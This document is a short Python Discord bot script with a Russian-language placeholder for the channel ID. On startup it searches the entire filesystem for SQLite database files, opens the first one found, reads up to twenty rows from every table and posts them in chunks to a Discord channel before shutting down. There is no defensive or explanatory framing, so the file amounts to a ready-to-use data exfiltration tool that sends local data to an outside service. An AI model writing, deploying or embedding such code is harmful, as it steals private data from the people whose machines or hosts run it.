import os
import sqlite3
import discord
from discord.ext import commands

TOKEN = os.getenv("TOKEN")

DUMP_CHANNEL_ID = ТУТ_АЙДИ_ТВОЕГО_КАНАЛА

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)


def find_db():
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith((".db", ".sqlite", ".sqlite3")):
                return os.path.join(root, file)
    return None


@bot.event
async def on_ready():
    channel = bot.get_channel(DUMP_CHANNEL_ID)

    db_path = find_db()

    if not db_path:
        await channel.send("DB NOT FOUND")
        return

    await channel.send(f"FOUND DB: `{db_path}`")

    try:
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row

        cursor = conn.cursor()

        cursor.execute(
            "SELECT name FROM sqlite_master WHERE type='table'"
        )

        tables = cursor.fetchall()

        for table in tables:
            table_name = table["name"]

            await channel.send(f"TABLE: `{table_name}`")

            rows = conn.execute(
                f"SELECT * FROM {table_name} LIMIT 20"
            ).fetchall()

            if not rows:
                await channel.send("EMPTY")
                continue

            text = ""

            for row in rows:
                text += str(dict(row)) + "\n"

            while text:
                chunk = text[:1900]
                text = text[1900:]
                await channel.send(f"```python\n{chunk}\n```")

        conn.close()

    except Exception as e:
        await channel.send(f"ERROR: {e}")

    await bot.close()


bot.run(TOKEN)
